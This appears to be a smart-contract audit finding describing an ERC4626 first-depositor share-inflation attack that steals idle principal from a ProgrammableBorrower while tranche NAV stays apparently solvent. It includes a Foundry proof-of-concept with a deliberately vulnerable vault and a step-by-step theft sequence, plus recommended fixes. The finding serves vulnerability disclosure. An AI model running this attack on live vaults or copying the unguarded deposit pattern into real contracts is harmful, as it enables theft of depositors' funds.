### Title
ERC4626 share inflation can steal programmable-borrower deposits while tranche NAV remains solvent - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower` accepts an arbitrary ERC4626 vault configured by management and deposits idle epoch principal without enforcing a minimum share output. An unprivileged depositor in that vault can perform a first-depositor/share-price inflation attack, cause the programmable borrower to receive zero shares for its deposit, and redeem the attacker-controlled shares for the pooled assets. The protocol then floors the resulting vault loss to zero instead of impairing tranche NAV, so the theft can remain hidden until principal is recalled or withdrawals are funded.

### Finding Description
Vault validation only checks that the configured ERC4626 uses the same underlying asset; it does not verify vault supply, share price, previewed shares, or returned shares. [1](#0-0)  During `onStartEpoch`, the contract snapshots on-hand underlying plus current vault assets and deposits all idle underlying into the configured vault. [2](#0-1)  `_depositToVault` accepts the ERC4626-returned share amount without a lower bound, so a manipulated vault may return zero shares while retaining the deposited assets. [3](#0-2) 

An attacker who is merely a user of the configured ERC4626 vault can seed it with one share and donate more underlying than the incoming pool deposit. In an inflation-vulnerable ERC4626 implementation, the pool deposit mints zero shares, after which the attacker redeems the vault's entire share supply and receives both the donation and the pool deposit. `ProgrammableBorrower` recognizes the missing position as `loss`, but `totalInterestDueNow` clamps the result to zero when loss exceeds gains. [4](#0-3)  In minted-interest mode, `IdleCDOEpochVariant` therefore treats the epoch as zero-interest and does not pull principal unless the pool is being closed. [5](#0-4)  The strategy-token supply continues to represent the stolen principal even though the borrower contract owns no vault shares. [6](#0-5) 

### Impact Explanation
For a pool deposit `P`, the attacker can donate `D >= P`, force `vault.deposit(P, programmableBorrower)` to mint zero shares, and redeem their attacker-controlled supply for approximately `D + P`. The attacker's net profit is approximately `P` minus the initial dust deposit, while the credit vault becomes insolvent by `P`.

Because `_vaultNetInterest` reports a loss but `totalInterestDueNow` returns zero, the loss is not automatically reflected in tranche prices during a normal stop. Pending withdrawal claims, new deposits, and NAV accounting can continue as if the stolen principal remained backed. When enough principal is eventually requested or the pool is closed, recovery is capped by the missing vault assets, permanently socializing the attacker's theft across remaining tranche holders.

### Likelihood Explanation
The exploit requires the configured ERC4626 vault to be vulnerable to share-price inflation and the attacker to control enough of the vault's share supply to influence the pool's next deposit. `ProgrammableBorrower` provides no defense-in-depth check that would reject a zero or severely under-priced share receipt. A well-constructed vault may already include virtual shares or other first-depositor protections, but the contract's unrestricted `IERC4626` interface permits vault implementations without those protections.

### Recommendation
Require a nonzero and economically sane share result for every vault deposit, such as a `minSharesOut` derived from an operator-approved expected share price or a preconfigured slippage bound. Revert if `vault.deposit` returns fewer shares than expected. Separately, propagate vault losses that exceed accrued interest to `IdleCDOEpochVariant` so principal impairment is applied through the loss waterfall rather than being clamped inside `totalInterestDueNow`. Restrict vault configuration to audited ERC4626 implementations with known inflation resistance and maintain enough dead shares or seed liquidity to make first-depositor manipulation uneconomical.

### Proof of Concept
The following Foundry-style sequence demonstrates the accounting failure. `InflationVault` models an ERC4626 implementation without first-depositor protection; the important protocol behavior is that `ProgrammableBorrower` accepts a zero-share deposit and the CDO treats the stolen principal as merely zero epoch interest.

```solidity
// test/foundry/ProgrammableBorrowerShareInflation.t.sol
contract InflationVault is ERC20, IERC4626 {
    IERC20Detailed public immutable assetToken;

    constructor(IERC20Detailed asset_) ERC20("Vault Share", "vSHARE") {
        assetToken = asset_;
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function totalAssets() public view returns (uint256) {
        return assetToken.balanceOf(address(this));
    }

    function convertToShares(uint256 assets) public view returns (uint256) {
        uint256 supply = totalSupply();
        return supply == 0 ? assets : assets * supply / totalAssets();
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply();
        return supply == 0 ? shares : shares * totalAssets() / supply;
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        shares = convertToShares(assets);
        assetToken.safeTransferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares); // May mint zero.
    }

    function withdraw(uint256 assets, address receiver, address owner)
        external
        returns (uint256 shares)
    {
        shares = convertToShares(assets);
        _burn(owner, shares);
        assetToken.safeTransfer(receiver, assets);
    }

    function redeem(uint256 shares, address receiver, address owner)
        external
        returns (uint256 assets)
    {
        assets = convertToAssets(shares);
        _burn(owner, shares);
        assetToken.safeTransfer(receiver, assets);
    }

    function balanceOf(address account) public view override(ERC20, IERC4626) returns (uint256) {
        return ERC20.balanceOf(account);
    }
}

function testVaultShareInflationStealsEpochDeposit() public {
    uint256 poolDeposit = 1_000e6;
    uint256 donation = poolDeposit;

    InflationVault inflatedVault = new InflationVault(underlying);

    // Attacker obtains the entire initial share supply for 1 wei.
    deal(address(underlying), attacker, donation + 1);
    vm.startPrank(attacker);
    underlying.approve(address(inflatedVault), type(uint256).max);
    inflatedVault.deposit(1, attacker);
    underlying.transfer(address(inflatedVault), donation);
    vm.stopPrank();

    // Honest manager configures the asset-compatible vault.
    vm.prank(borrowerManager);
    programmableBorrower.setVault(address(inflatedVault));

    // Normal CDO deposit and epoch start sends poolDeposit to ProgrammableBorrower.
    vm.prank(owner);
    cdoEpoch.setIsInterestMinted(true);
    idleCDO.depositAA(poolDeposit);
    _startEpochAndCheckPrices(0);

    // The inflated share price rounded the pool's deposit to zero shares.
    assertEq(inflatedVault.balanceOf(address(programmableBorrower)), 0);
    assertEq(underlying.balanceOf(address(programmableBorrower)), 0);
    assertEq(programmableBorrower.vaultLoss(), poolDeposit);
    assertEq(programmableBorrower.totalInterestDueNow(), 0);

    // Attacker redeems the whole vault and recovers donation + poolDeposit.
    vm.prank(attacker);
    uint256 stolen = inflatedVault.redeem(
        inflatedVault.balanceOf(attacker),
        attacker,
        attacker
    );
    assertApproxEqAbs(stolen, donation + poolDeposit + 1, 1);

    // A normal stop succeeds without recognizing principal impairment.
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    // NAV remains represented by strategy tokens even though P was stolen.
    assertGt(cdoEpoch.getContractValue(), 0);
}
```
